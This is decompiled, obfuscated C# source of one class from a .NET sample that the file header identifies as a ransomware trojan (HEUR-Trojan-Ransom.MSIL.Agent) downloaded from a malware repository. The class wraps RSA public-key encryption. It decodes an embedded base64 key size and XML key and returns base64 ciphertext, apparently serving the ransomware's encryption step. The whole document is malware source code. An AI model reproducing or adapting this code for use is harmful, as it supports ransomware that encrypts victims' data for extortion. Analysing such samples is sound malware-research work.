// Decompiled with JetBrains decompiler
// Type: oXSOOyVgTNm.uNKhrFAtKoRBVa
// Assembly: Skylandshare, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BA04C86B-6DB4-4F58-B4B2-0DD203E57103
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Agent.gen-8d268be58a27d2c980b807ffe703ea28b0fd0cd1ba2e455902faebe9ec17c52e.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace oXSOOyVgTNm
{
  public static class uNKhrFAtKoRBVa
  {
    private static bool QppLQqQsMlBNrw;
    private static readonly string ymlKoexalGrAXs;
    [NonSerialized]
    internal static GetString \u0007;

    public static string EnHLHyVjWIb([In] string obj0)
    {
      int MPldJEzNtGRqDBeY = 0;
      string HELpVydqbWDEf = uNKhrFAtKoRBVa.\u0007(107389483);
      uNKhrFAtKoRBVa.DBrosjPsYhrb(uNKhrFAtKoRBVa.ymlKoexalGrAXs, out MPldJEzNtGRqDBeY, out HELpVydqbWDEf);
      return Convert.ToBase64String(uNKhrFAtKoRBVa.eUIxEIQxlsvV(Encoding.UTF8.GetBytes(obj0), MPldJEzNtGRqDBeY, HELpVydqbWDEf));
    }

    private static byte[] eUIxEIQxlsvV([In] byte[] obj0, [In] int obj1, [In] string obj2)
    {
      if (obj0 == null || obj0.Length == 0)
        throw new ArgumentException(uNKhrFAtKoRBVa.\u0007(107401696), uNKhrFAtKoRBVa.\u0007(107401707));
      int num = uNKhrFAtKoRBVa.XXhYQkKkGVdCP(obj1);
      if (obj0.Length > num)
        throw new ArgumentException(string.Format(uNKhrFAtKoRBVa.\u0007(107401154), (object) num), uNKhrFAtKoRBVa.\u0007(107401707));
      if (!uNKhrFAtKoRBVa.BNyiPhUxPjBWt(obj1))
        throw new ArgumentException(uNKhrFAtKoRBVa.\u0007(107401117), uNKhrFAtKoRBVa.\u0007(107401088));
      if (string.IsNullOrEmpty(obj2))
        throw new ArgumentException(uNKhrFAtKoRBVa.\u0007(107401075), uNKhrFAtKoRBVa.\u0007(107401046));
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(obj1))
      {
        cryptoServiceProvider.FromXmlString(obj2);
        return cryptoServiceProvider.Encrypt(obj0, uNKhrFAtKoRBVa.QppLQqQsMlBNrw);
      }
    }

    private static int XXhYQkKkGVdCP([In] int obj0) => uNKhrFAtKoRBVa.QppLQqQsMlBNrw ? (obj0 - 384) / 8 + 7 : (obj0 - 384) / 8 + 37;

    private static bool BNyiPhUxPjBWt([In] int obj0) => obj0 >= 384 && obj0 <= 16384 && obj0 % 8 == 0;

    private static void DBrosjPsYhrb(
      string vhDSzCKrKquiCrfh,
      out int MPldJEzNtGRqDBeY,
      out string HELpVydqbWDEf)
    {
      MPldJEzNtGRqDBeY = 0;
      HELpVydqbWDEf = uNKhrFAtKoRBVa.\u0007(107389483);
      if (vhDSzCKrKquiCrfh == null || vhDSzCKrKquiCrfh.Length <= 0)
        return;
      string str = Encoding.UTF8.GetString(Convert.FromBase64String(vhDSzCKrKquiCrfh));
      if (!str.Contains(uNKhrFAtKoRBVa.\u0007(107401061)))
        return;
      string[] strArray = str.Split(new char[1]{ '!' }, 2);
      try
      {
        MPldJEzNtGRqDBeY = int.Parse(strArray[0]);
        HELpVydqbWDEf = strArray[1];
      }
      catch (Exception ex)
      {
      }
    }

    static uNKhrFAtKoRBVa()
    {
      Strings.CreateGetStringDelegate(typeof (uNKhrFAtKoRBVa));
      uNKhrFAtKoRBVa.QppLQqQsMlBNrw = false;
      uNKhrFAtKoRBVa.ymlKoexalGrAXs = uNKhrFAtKoRBVa.\u0007(107401024);
    }
  }
}
